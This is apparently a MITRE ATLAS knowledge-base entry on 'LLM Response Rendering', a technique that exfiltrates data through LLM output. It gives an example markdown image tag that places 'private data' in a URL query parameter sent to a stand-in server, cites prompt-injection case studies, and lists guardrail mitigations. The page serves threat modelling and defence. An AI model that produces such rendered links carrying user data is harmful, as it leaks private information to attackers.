# AML.T0077 - LLM Response Rendering

[MITRE ATLAS](../../../README.md) / [AML.TA0010 - Exfiltration](../README.md)

Adversaries may induce a large language model (LLM) to respond with private information structured in a reference to external content that, when rendered by the user's client, makes a request to an adversary-controlled server, exfiltrating the data. The private information can be hidden from the user and the external content can still render properly in the user's client, thus not raising the suspicion of the user.

Rendered content can include images, embedded webpages, or link previews and may use HTML, Markdown, or other rendering mechanisms. The private information can be hidden in parts of the URL pointing to an adversary-controlled server, including query parameters or URL path segments, and may be split across multiple requests. Markdown or HTML image tags may automatically render directly in the user's AI chat client. Integrations into applications such as Slack or Microsoft Teams may render external content automatically without requiring the user to take any action.


As an example, the adversary may manipulate the LLM to produce the following markdown:
```
![ATLAS](https://atlas.mitre.org/image.png?secrets="private data")
```

Which is rendered by the client as:
```
<img src="https://atlas.mitre.org/image.png?secrets="private data">
```

When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.

**Tactics**  [AML.TA0010 - Exfiltration](../README.md)

**Platforms**  [Generative AI](../../../Platforms/Generative%20AI.md), [Agentic AI](../../../Platforms/Agentic%20AI.md)

**Maturity**  Demonstrated

## Case studies

- [AML.CS0021 - ChatGPT Conversation Exfiltration](../../../Case%20Studies/Exercises/AML.CS0021%20-%20ChatGPT%20Conversation%20Exfiltration.md) · [S04](../../../Case%20Studies/Exercises/AML.CS0021%20-%20ChatGPT%20Conversation%20Exfiltration.md#step-s04)
- [AML.CS0029 - Google Bard Conversation Exfiltration](../../../Case%20Studies/Exercises/AML.CS0029%20-%20Google%20Bard%20Conversation%20Exfiltration.md) · [S05](../../../Case%20Studies/Exercises/AML.CS0029%20-%20Google%20Bard%20Conversation%20Exfiltration.md#step-s05)
- [AML.CS0035 - Data Exfiltration from Slack AI via Indirect Prompt Injection](../../../Case%20Studies/Exercises/AML.CS0035%20-%20Data%20Exfiltration%20from%20Slack%20AI%20via%20Indirect%20Prompt%20Injection.md) · [S07](../../../Case%20Studies/Exercises/AML.CS0035%20-%20Data%20Exfiltration%20from%20Slack%20AI%20via%20Indirect%20Prompt%20Injection.md#step-s07)
- [AML.CS0059 - EchoLeak: Zero-Click Prompt Injection Targeting M365 Copilot for Data Exfiltration](../../../Case%20Studies/Exercises/AML.CS0059%20-%20EchoLeak%20-%20Zero-Click%20Prompt%20Injection%20Targeting%20M365%20Copilot%20for%20Data%20Exfil.md) · [S09](../../../Case%20Studies/Exercises/AML.CS0059%20-%20EchoLeak%20-%20Zero-Click%20Prompt%20Injection%20Targeting%20M365%20Copilot%20for%20Data%20Exfil.md#step-s09)
- [AML.CS0060 - Cross-Site Scripting via Prompt Manipulation in Lenovo AI Chatbot](../../../Case%20Studies/Exercises/AML.CS0060%20-%20Cross-Site%20Scripting%20via%20Prompt%20Manipulation%20in%20Lenovo%20AI%20Chatbot.md) · [S08](../../../Case%20Studies/Exercises/AML.CS0060%20-%20Cross-Site%20Scripting%20via%20Prompt%20Manipulation%20in%20Lenovo%20AI%20Chatbot.md#step-s08)

## Mitigations

- [AML.M0020 - Generative AI Guardrails](../../../Mitigations/AML.M0020%20-%20Generative%20AI%20Guardrails.md) — Validate generated HTML, Markdown, links, and embedded resources before rendering or fetching external content. Block unauthorized destinations and references that encode sensitive information in URL paths or query parameters, including requests triggered automatically by previews. Consider blocking the URLs from responses entirely.

[Official ATLAS record](https://atlas.mitre.org/techniques/AML.T0077)
